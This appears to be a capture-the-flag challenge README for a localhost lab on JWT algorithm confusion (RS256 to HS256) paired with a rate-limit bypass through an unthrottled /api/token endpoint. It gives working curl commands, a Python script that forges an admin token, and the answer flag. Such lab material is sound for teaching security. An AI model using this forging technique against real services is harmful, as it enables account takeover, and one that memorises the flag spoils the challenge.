# S7BEN-HARD-004: Auth Bypass with Rate Limiting

**Category:** A07:2021 - Authentication Failures
**Difficulty:** Medium
**Points:** 160

## Overview

Exploit JWT algorithm confusion and rate limiting bypass to forge an admin token and capture the flag.

**Key Vulnerabilities:**
- Rate limiting only on `/login`, not `/api/token`
- JWT algorithm confusion (RS256 → HS256)
- Public key exposed at `/api/jwks`

## Quick Start

```bash
make up      # Start services
make test    # Health check
make exploit # Auto-exploit
make down    # Stop
```

## Target

- **URL:** http://localhost
- **Endpoints:** `/login`, `/api/token`, `/api/jwks`, `/admin/flag`

## Exploitation Steps

### 1. Discover Alternative Login Endpoint

```bash
# /login is rate limited (5 req/min)
# /api/token is NOT rate limited (bypass!)
curl -X POST http://localhost/api/token \
  -H 'Content-Type: application/json' \
  -d '{"username":"user","password":"user123"}'
```

### 2. Get Public Key

```bash
curl http://localhost/api/jwks
```

Save the public key PEM.

### 3. Forge Admin JWT

Use the public key as HS256 secret:

```python
import jwt

public_key = """-----BEGIN PUBLIC KEY-----
[PEM content from /api/jwks]
-----END PUBLIC KEY-----"""

payload = {
    'username': 'attacker',
    'role': 'admin',
    'exp': 9999999999
}

# Sign with public key using HS256 (algorithm confusion)
token = jwt.encode(payload, public_key, algorithm='HS256')
print(token)
```

### 4. Access Admin Endpoint

```bash
curl http://localhost/admin/flag \
  -H "Authorization: Bearer YOUR_FORGED_TOKEN"
```

## Flag

Successfully exploit to retrieve: `S7BEN{jwt_alg0_c0nfusion_rs256_to_hs256_xyz789}`

## References

- [JWT Algorithm Confusion](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [CVE-2015-9235](https://nvd.nist.gov/vuln/detail/CVE-2015-9235)
